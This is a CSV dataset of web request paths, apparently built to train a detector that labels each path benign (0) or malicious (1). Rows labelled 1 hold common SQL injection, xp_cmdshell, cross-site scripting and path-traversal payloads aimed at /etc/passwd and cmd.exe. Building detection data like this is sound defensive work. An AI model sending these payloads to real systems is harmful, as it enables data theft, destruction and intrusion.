payload,label
/contact?user=urmit24,0
/dashboard,0
/login?sort=asc23,0
/login?category=tech676,0
/api/users,0
/api/users?category=tech884,0
/about?user=urmit226,0
/login?id=1935,0
/contact?page=2907,0
/api/users?sort=asc455,0
/login?page=2790,0
/index.html?search=' OR '1'='1,1
/'; EXEC xp_cmdshell('dir');--,1
/api/users?category=tech226,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/contact?category=tech466,0
/index.html?user=urmit902,0
/' OR '1'='1,1
/about?id=1682,0
/' OR '1'='1,1
/products/item?sort=asc800,0
/about?id=1341,0
/<script>alert(document.cookie)</script>,1
/products/item?category=tech515,0
/index.html?page=2516,0
/checkout?user=urmit133,0
"/dashboard?search=UNION SELECT username, password FROM users",1
/../../../windows/system32/cmd.exe,1
/index.html?page=2602,0
/products/item?search=?id=1; DROP TABLE users,1
/../../../../etc/passwd,1
/../../../../etc/passwd,1
/dashboard?page=2636,0
/contact?id=1411,0
/?id=1; DROP TABLE users,1
/login,0
/contact,0
/checkout?id=1699,0
/products/item?category=tech378,0
/index.html?user=urmit448,0
/api/users?user=urmit417,0
/index.html?category=tech151,0
/api/users?id=1598,0
/index.html?page=260,0
/login?id=1593,0
/index.html?sort=asc463,0
/../../../windows/system32/cmd.exe,1
"/UNION SELECT username, password FROM users",1
/about?user=urmit183,0
/onload=prompt(1),1
/index.html?sort=asc830,0
/products/item,0
/login?page=2939,0
/dashboard?page=2213,0
/index.html?sort=asc249,0
/index.html?page=2923,0
"/products/item?search=UNION SELECT username, password FROM users",1
/api/users?user=urmit128,0
/contact?user=urmit617,0
/contact,0
/login?page=2973,0
/about?search=../../../windows/system32/cmd.exe,1
/login?search=admin' --,1
/products/item?category=tech773,0
/api/users,0
/contact?search=' OR '1'='1,1
/checkout,0
/login,0
/<script>alert(document.cookie)</script>,1
/index.html?category=tech663,0
/products/item?user=urmit799,0
/contact?user=urmit929,0
/contact,0
/index.html?search=?id=1; DROP TABLE users,1
/dashboard?page=2633,0
/index.html?page=2475,0
/products/item?user=urmit26,0
/products/item?page=2541,0
/checkout?user=urmit763,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/onload=prompt(1),1
/dashboard?sort=asc874,0
/contact?id=1526,0
/about?page=2472,0
/dashboard?sort=asc53,0
/checkout?user=urmit870,0
/dashboard?id=1835,0
/api/users?category=tech56,0
/login?category=tech566,0
/about?search=../../../../etc/passwd,1
/javascript:eval('var a=1'),1
/index.html?search=' OR '1'='1,1
/index.html?search=?id=1; DROP TABLE users,1
/contact?category=tech367,0
/login?id=1625,0
/about?page=284,0
/about,0
/api/users?page=2768,0
/products/item?user=urmit461,0
/products/item?search=javascript:eval('var a=1'),1
/products/item?category=tech739,0
/products/item?user=urmit176,0
/<script>alert(document.cookie)</script>,1
/login?page=2506,0
/api/users,0
/dashboard,0
/login?sort=asc426,0
/index.html?page=2119,0
/about?search=../../../../etc/passwd,1
/../../../windows/system32/cmd.exe,1
/products/item?user=urmit216,0
/contact?sort=asc225,0
/index.html?sort=asc647,0
/index.html?search='; EXEC xp_cmdshell('dir');--,1
/login,0
/login?search=<script>alert(document.cookie)</script>,1
/index.html?search=onload=prompt(1),1
/index.html,0
/api/users,0
/index.html?user=urmit118,0
/admin' --,1
/dashboard?category=tech623,0
/checkout?category=tech136,0
/about?sort=asc316,0
/login?page=2399,0
/about?category=tech68,0
/about?user=urmit721,0
/api/users?category=tech329,0
/javascript:eval('var a=1'),1
/about?page=2972,0
/dashboard?sort=asc839,0
/products/item?category=tech581,0
/index.html?sort=asc33,0
/index.html?category=tech403,0
/about?page=2976,0
/dashboard?sort=asc111,0
/login?sort=asc739,0
/login,0
/checkout?category=tech116,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?category=tech954,0
/about,0
/dashboard,0
/checkout?user=urmit388,0
/checkout?id=1629,0
/dashboard?sort=asc811,0
/contact?id=1446,0
/login?sort=asc249,0
/contact?user=urmit845,0
/login?sort=asc717,0
/api/users?user=urmit71,0
/checkout?page=2428,0
/products/item?user=urmit116,0
/onload=prompt(1),1
/dashboard?id=1799,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html,0
/contact?sort=asc83,0
/contact,0
/contact?category=tech558,0
/about?user=urmit651,0
/login?category=tech629,0
/dashboard?category=tech416,0
/about?id=1851,0
/checkout?page=2455,0
/index.html?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?id=1460,0
/index.html?category=tech789,0
/about?category=tech450,0
/login?sort=asc948,0
/about?sort=asc654,0
/api/users?page=2553,0
/index.html?user=urmit849,0
/checkout?search='; EXEC xp_cmdshell('dir');--,1
/index.html?page=2219,0
/api/users?page=2503,0
/'; EXEC xp_cmdshell('dir');--,1
/api/users,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item,0
/dashboard,0
/?id=1; DROP TABLE users,1
/about?search='; EXEC xp_cmdshell('dir');--,1
/checkout?category=tech472,0
/products/item,0
/contact?sort=asc42,0
/contact?category=tech413,0
/login?sort=asc710,0
/login?page=2499,0
/login?user=urmit190,0
/about?sort=asc998,0
/index.html?sort=asc752,0
/dashboard?user=urmit324,0
/products/item?user=urmit483,0
/index.html?user=urmit714,0
/login?page=2803,0
/login?user=urmit334,0
/about?id=1277,0
/login?page=2282,0
/products/item?user=urmit933,0
/about?id=1953,0
/about?user=urmit182,0
/index.html?search=admin' --,1
/checkout?user=urmit981,0
/contact?page=2133,0
/index.html?user=urmit322,0
/checkout?search=?id=1; DROP TABLE users,1
/index.html?search='; EXEC xp_cmdshell('dir');--,1
/login?sort=asc328,0
/products/item?category=tech266,0
/checkout?user=urmit175,0
/index.html,0
/index.html?id=1298,0
/checkout?user=urmit695,0
/checkout?category=tech198,0
/products/item?page=2686,0
/checkout,0
/checkout?category=tech226,0
"/index.html?search="" OR 1=1 --",1
/login?sort=asc788,0
/index.html,0
/api/users?sort=asc591,0
/contact?sort=asc677,0
/login?page=2352,0
/api/users?user=urmit374,0
/index.html?category=tech736,0
/dashboard?id=138,0
/contact?sort=asc966,0
/login?page=2327,0
/login?sort=asc168,0
/checkout?id=1885,0
/contact?search=../../../windows/system32/cmd.exe,1
/api/users?id=1975,0
/checkout?page=2463,0
/' OR '1'='1,1
/about?page=2301,0
/login?category=tech84,0
/dashboard?user=urmit797,0
/products/item,0
/contact?search=../../../../etc/passwd,1
/login?user=urmit61,0
/api/users,0
/index.html?category=tech333,0
/checkout?sort=asc165,0
/api/users?sort=asc738,0
/products/item?search=../../../../etc/passwd,1
/products/item?sort=asc682,0
/api/users?page=2738,0
/contact?sort=asc535,0
/api/users?id=1988,0
/contact?sort=asc439,0
/login,0
/javascript:eval('var a=1'),1
/api/users?page=2382,0
/contact?user=urmit494,0
/index.html?user=urmit875,0
/api/users?page=2901,0
/?id=1; DROP TABLE users,1
/index.html?id=1234,0
/login?page=21,0
/login?page=2726,0
/products/item?user=urmit543,0
/dashboard,0
"/UNION SELECT username, password FROM users",1
/products/item?search=../../../../etc/passwd,1
/dashboard,0
/index.html?id=1844,0
/'; EXEC xp_cmdshell('dir');--,1
/contact?id=1277,0
/products/item,0
/login?sort=asc816,0
/contact?user=urmit527,0
/' OR '1'='1,1
/login?search=../../../../etc/passwd,1
/contact?page=295,0
"/"" OR 1=1 --",1
/about?category=tech215,0
/<script>alert(document.cookie)</script>,1
/about?sort=asc374,0
/'; EXEC xp_cmdshell('dir');--,1
/checkout?id=1964,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?sort=asc935,0
/login?category=tech618,0
/index.html?page=2567,0
/index.html?id=1818,0
/login?sort=asc594,0
/login?category=tech821,0
/<script>alert(document.cookie)</script>,1
/products/item,0
/about?sort=asc120,0
/contact?id=1220,0
/api/users?id=1301,0
/contact?page=2695,0
/api/users?sort=asc957,0
/login?user=urmit549,0
/dashboard?page=252,0
/checkout?page=2138,0
/dashboard?user=urmit526,0
/contact?page=2398,0
/about?search=../../../windows/system32/cmd.exe,1
/about?search=<script>alert(document.cookie)</script>,1
/?id=1; DROP TABLE users,1
/api/users?sort=asc22,0
"/UNION SELECT username, password FROM users",1
/products/item?sort=asc676,0
/login?sort=asc305,0
/api/users?user=urmit365,0
/login,0
/about?search=../../../windows/system32/cmd.exe,1
"/UNION SELECT username, password FROM users",1
/checkout?id=1330,0
/index.html?user=urmit890,0
/index.html?search=<script>alert(document.cookie)</script>,1
/../../../windows/system32/cmd.exe,1
/contact?sort=asc684,0
/index.html?sort=asc135,0
/index.html?sort=asc256,0
/api/users?page=2693,0
/checkout?id=1684,0
/contact?user=urmit947,0
/products/item?user=urmit381,0
/contact?sort=asc511,0
/api/users,0
/checkout?page=2760,0
/../../../../etc/passwd,1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?sort=asc754,0
/index.html?category=tech436,0
/dashboard?category=tech905,0
/about?id=196,0
/checkout?user=urmit413,0
/login?user=urmit968,0
/api/users,0
/products/item?id=1360,0
/login,0
/about?sort=asc975,0
/javascript:eval('var a=1'),1
/login?sort=asc712,0
/dashboard?sort=asc296,0
/about,0
/about,0
"/index.html?search=UNION SELECT username, password FROM users",1
/index.html?sort=asc461,0
/dashboard?search=onload=prompt(1),1
/index.html?search=?id=1; DROP TABLE users,1
/dashboard?user=urmit446,0
/index.html,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?category=tech916,0
/about?sort=asc476,0
/products/item?page=2913,0
/checkout?category=tech847,0
/checkout?user=urmit146,0
/dashboard,0
/contact?category=tech831,0
/contact,0
/api/users?sort=asc981,0
/about,0
/products/item,0
/<script>alert(document.cookie)</script>,1
/checkout?sort=asc505,0
/api/users?id=188,0
/dashboard,0
/api/users?sort=asc54,0
/products/item?sort=asc861,0
/../../../../etc/passwd,1
/login?search=admin' --,1
/login?user=urmit958,0
/login?category=tech803,0
/about?category=tech882,0
/contact?category=tech638,0
/api/users,0
/login?page=2861,0
/login?sort=asc483,0
/../../../../etc/passwd,1
/products/item?user=urmit990,0
/index.html?category=tech336,0
/products/item?id=1613,0
/checkout?sort=asc322,0
/contact?search=admin' --,1
/contact?id=1815,0
/products/item?category=tech541,0
/products/item?id=1387,0
/products/item,0
/about?sort=asc188,0
/dashboard?page=2880,0
/checkout?sort=asc89,0
/contact?sort=asc41,0
/products/item?id=1769,0
/index.html?sort=asc704,0
/../../../windows/system32/cmd.exe,1
/dashboard?user=urmit308,0
"/dashboard?search="" OR 1=1 --",1
/products/item?id=1146,0
/about?page=2949,0
/login?page=2201,0
/index.html?user=urmit432,0
/index.html?search=' OR '1'='1,1
/dashboard?sort=asc833,0
/login?id=146,0
/api/users?sort=asc609,0
/index.html,0
/api/users?search=<script>alert(document.cookie)</script>,1
/login?search=../../../../etc/passwd,1
/checkout?page=2797,0
/dashboard?id=1726,0
/login?search=<script>alert(document.cookie)</script>,1
/dashboard?user=urmit67,0
/contact?category=tech188,0
/api/users,0
/contact,0
/index.html?page=2370,0
/login?sort=asc455,0
/login?category=tech723,0
/contact?search=admin' --,1
/admin' --,1
/checkout?category=tech28,0
/login?page=2493,0
/checkout?user=urmit385,0
/login?search=admin' --,1
/dashboard?page=2235,0
"/login?search=UNION SELECT username, password FROM users",1
/checkout?id=1778,0
/index.html?sort=asc101,0
/?id=1; DROP TABLE users,1
/login?category=tech472,0
/dashboard?user=urmit817,0
/login?category=tech284,0
/about?page=2849,0
/about?id=1651,0
/contact?search=' OR '1'='1,1
/products/item?id=1987,0
/about?user=urmit347,0
/contact,0
/api/users?page=2332,0
/api/users?category=tech506,0
/api/users?user=urmit756,0
"/checkout?search=UNION SELECT username, password FROM users",1
/login?page=284,0
/index.html,0
/index.html?page=2760,0
/about?user=urmit467,0
/about?id=1705,0
/dashboard?id=1622,0
/index.html,0
/products/item?id=1530,0
/api/users,0
/login?page=2792,0
/products/item?sort=asc345,0
/products/item?user=urmit786,0
/contact?category=tech444,0
/about?category=tech668,0
/products/item?category=tech156,0
/admin' --,1
/about,0
/contact?search=admin' --,1
/checkout?id=1298,0
/about?id=1714,0
/api/users?user=urmit329,0
/api/users?user=urmit444,0
/about,0
"/"" OR 1=1 --",1
/dashboard?sort=asc431,0
/checkout?page=2239,0
/checkout?id=119,0
/dashboard?sort=asc848,0
/login?page=2997,0
/products/item?category=tech909,0
/products/item,0
/api/users?page=2113,0
/products/item?sort=asc954,0
/about?user=urmit802,0
/checkout?sort=asc925,0
/about?page=255,0
/index.html?id=1217,0
/api/users?page=2226,0
/contact?sort=asc101,0
/login?sort=asc103,0
/checkout?id=1491,0
/dashboard?category=tech819,0
/about?id=13,0
/checkout?sort=asc370,0
/api/users?user=urmit652,0
/index.html,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item?page=2203,0
/contact?user=urmit872,0
/api/users?category=tech505,0
/checkout,0
/login?category=tech139,0
/index.html?page=276,0
/' OR '1'='1,1
/about?id=1315,0
/index.html?id=1512,0
/dashboard?page=2509,0
/products/item?id=146,0
/dashboard?id=1180,0
/dashboard?search=onload=prompt(1),1
/api/users?id=1939,0
/index.html,0
/index.html?sort=asc679,0
/products/item?user=urmit535,0
/../../../windows/system32/cmd.exe,1
/dashboard?user=urmit612,0
/login?sort=asc969,0
/api/users?sort=asc97,0
/products/item?page=2839,0
/api/users,0
/index.html?category=tech481,0
/api/users?user=urmit320,0
/products/item?sort=asc916,0
/about?search=../../../../etc/passwd,1
/products/item?category=tech136,0
/login?search=' OR '1'='1,1
/checkout?user=urmit978,0
/api/users?user=urmit73,0
/index.html?user=urmit336,0
/checkout?search=<script>alert(document.cookie)</script>,1
/contact?category=tech542,0
/products/item?user=urmit91,0
/api/users?category=tech57,0
/api/users?user=urmit103,0
/products/item?user=urmit147,0
/index.html?search='; EXEC xp_cmdshell('dir');--,1
/login?user=urmit578,0
/about?id=1966,0
/login?category=tech755,0
/products/item?user=urmit357,0
/login?search=../../../windows/system32/cmd.exe,1
/contact?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?category=tech743,0
/products/item?sort=asc17,0
/login?category=tech561,0
/products/item?search=javascript:eval('var a=1'),1
/checkout?search=?id=1; DROP TABLE users,1
/about?category=tech643,0
/products/item?user=urmit822,0
/about?category=tech742,0
/login?id=1206,0
/api/users?sort=asc970,0
/about?page=2894,0
/' OR '1'='1,1
/checkout,0
/products/item?user=urmit635,0
/login?id=1636,0
/dashboard?id=1157,0
/api/users?page=2626,0
/contact?search=admin' --,1
/about?search=onload=prompt(1),1
/login?page=2707,0
/contact?sort=asc530,0
/about?user=urmit36,0
/products/item?user=urmit849,0
/contact?user=urmit907,0
/checkout?search='; EXEC xp_cmdshell('dir');--,1
/login?sort=asc501,0
/contact,0
/products/item?page=298,0
/login?user=urmit153,0
/login,0
/api/users?page=2807,0
/contact?id=1670,0
/api/users?category=tech337,0
/about?sort=asc315,0
/checkout?category=tech400,0
/login?id=1116,0
/login?category=tech898,0
/about?id=1709,0
/login?sort=asc208,0
/checkout?id=1386,0
/login?page=2368,0
/contact?sort=asc598,0
/api/users?sort=asc119,0
/products/item?id=1962,0
/api/users?user=urmit196,0
/admin' --,1
/login?search=onload=prompt(1),1
/' OR '1'='1,1
/about?sort=asc425,0
/api/users?sort=asc100,0
/api/users?id=1343,0
/products/item?search=onload=prompt(1),1
/about?user=urmit343,0
/login?category=tech521,0
/index.html?sort=asc354,0
/checkout?page=2300,0
/api/users,0
"/"" OR 1=1 --",1
/dashboard?id=194,0
/contact,0
/contact?user=urmit661,0
/checkout?user=urmit780,0
/contact?id=1992,0
/checkout,0
/about?id=1113,0
/products/item?user=urmit973,0
/login?search=../../../windows/system32/cmd.exe,1
/../../../../etc/passwd,1
/contact,0
/dashboard,0
/about?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?page=2553,0
/index.html,0
/about?category=tech764,0
/api/users?id=130,0
/?id=1; DROP TABLE users,1
/about,0
/contact?id=1835,0
/api/users?sort=asc918,0
/products/item?id=1493,0
/index.html?page=2611,0
/api/users,0
/products/item?search=../../../../etc/passwd,1
/login?user=urmit905,0
/contact?id=1585,0
/dashboard?page=2228,0
/products/item?sort=asc381,0
/contact?page=2214,0
/index.html?page=2905,0
/products/item?sort=asc946,0
/login?page=2425,0
/checkout?sort=asc305,0
/contact?page=2412,0
/contact,0
/dashboard?id=1657,0
/checkout?search=?id=1; DROP TABLE users,1
/dashboard?id=1146,0
/about?sort=asc242,0
/dashboard?user=urmit635,0
/login?page=2624,0
/index.html?sort=asc341,0
/dashboard?id=1276,0
/api/users?search=' OR '1'='1,1
/products/item?category=tech306,0
/login?search=' OR '1'='1,1
/api/users?page=294,0
/about?category=tech864,0
/login?user=urmit438,0
/contact?user=urmit638,0
/about,0
/index.html,0
/api/users?page=2991,0
/api/users?page=2448,0
/index.html?category=tech732,0
/contact?user=urmit345,0
/login?category=tech509,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?user=urmit205,0
/api/users?user=urmit985,0
/about?sort=asc344,0
/checkout?sort=asc114,0
/contact?page=2843,0
/dashboard?category=tech371,0
/products/item?category=tech366,0
/api/users,0
/about?user=urmit470,0
/contact?sort=asc118,0
/about,0
/api/users?sort=asc194,0
/index.html?sort=asc166,0
/about?sort=asc538,0
/api/users?category=tech834,0
/login?sort=asc167,0
/?id=1; DROP TABLE users,1
/<script>alert(document.cookie)</script>,1
/contact?category=tech806,0
/checkout,0
/contact,0
/api/users?search=?id=1; DROP TABLE users,1
/login?category=tech793,0
/index.html?sort=asc538,0
/contact?page=2794,0
/index.html?id=1288,0
/javascript:eval('var a=1'),1
"/products/item?search=UNION SELECT username, password FROM users",1
/admin' --,1
/about?sort=asc385,0
/../../../../etc/passwd,1
/index.html?user=urmit383,0
/dashboard?sort=asc588,0
/products/item?id=1503,0
/contact?user=urmit435,0
/contact?page=2182,0
/dashboard?page=2552,0
/api/users?page=2296,0
/index.html?id=164,0
/login?user=urmit305,0
/api/users?category=tech653,0
/api/users?user=urmit463,0
/dashboard,0
/javascript:eval('var a=1'),1
/javascript:eval('var a=1'),1
/contact?sort=asc863,0
/dashboard?category=tech201,0
/about,0
/api/users?search=../../../../etc/passwd,1
/login?sort=asc451,0
/login,0
/login?id=1663,0
/api/users?user=urmit177,0
/products/item?search=<script>alert(document.cookie)</script>,1
/products/item?search=../../../../etc/passwd,1
/about?category=tech249,0
/dashboard?id=1346,0
/contact?id=1485,0
/about?id=1136,0
/about?user=urmit827,0
/index.html?user=urmit160,0
/products/item?sort=asc953,0
/index.html?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?sort=asc625,0
/about?search=../../../windows/system32/cmd.exe,1
/login?user=urmit931,0
/index.html?id=1614,0
/about?sort=asc334,0
/contact?page=2541,0
/contact?page=253,0
/dashboard,0
/api/users?category=tech871,0
/products/item?page=2169,0
/index.html?id=1869,0
/index.html?sort=asc600,0
/login?id=1342,0
/?id=1; DROP TABLE users,1
/login,0
/checkout?search=javascript:eval('var a=1'),1
/index.html,0
/login?page=2446,0
/products/item?user=urmit452,0
/api/users,0
/index.html?id=1588,0
/about?id=1824,0
/login?sort=asc221,0
/index.html,0
/dashboard?search=admin' --,1
/products/item?user=urmit381,0
/index.html?search=?id=1; DROP TABLE users,1
/products/item?page=2715,0
/login?user=urmit622,0
/login?page=2626,0
/checkout?category=tech408,0
/dashboard?user=urmit292,0
/api/users?id=1703,0
/index.html?search=?id=1; DROP TABLE users,1
/index.html,0
/products/item?category=tech481,0
/api/users?user=urmit488,0
/api/users?page=2748,0
/login?user=urmit894,0
/login,0
/login?id=1812,0
/products/item?user=urmit421,0
/contact?page=2556,0
/?id=1; DROP TABLE users,1
"/about?search=UNION SELECT username, password FROM users",1
/products/item?category=tech81,0
/login?category=tech44,0
/contact?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?category=tech804,0
/index.html?sort=asc593,0
/products/item?category=tech450,0
/dashboard?page=2259,0
/checkout?user=urmit931,0
/checkout?id=1713,0
/dashboard?page=2504,0
/checkout?sort=asc580,0
/login?id=1670,0
/products/item?id=1406,0
/contact,0
/checkout?user=urmit613,0
/products/item,0
/checkout?category=tech495,0
/checkout,0
/contact,0
/products/item,0
